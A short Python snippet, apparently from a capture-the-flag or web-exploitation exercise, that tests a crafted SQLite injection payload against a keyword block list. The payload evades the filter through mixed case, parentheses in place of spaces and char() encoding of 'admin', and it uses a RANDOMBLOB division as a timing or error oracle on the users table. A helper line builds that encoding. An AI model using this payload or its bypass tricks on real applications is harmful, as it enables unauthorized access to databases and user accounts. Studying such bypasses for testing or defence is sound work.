sqli_filter = ['[', ']', ',', 'admin', 'select', '\'', '"', '\t', '\n', '\r', '\x08', '\x09', '\x00', '\x0b', '\x0d', ' ']
level = '(-123123)or((0x10)like(UPPER(HEX(RANDOMBLOB(1500000000/(SeLect(count(uid))from(users)where(uid=char(0x61)||char(0x64)||char(0x6d)||char(0x69)||char(0x6e))))))))'
for x in sqli_filter:
    if level.find(x) != -1:
        print ('No Hack! ::' + x)

qr = ''.join(['char({})||'.format(hex(ord(x))) for x in 'admin'])
#print qr

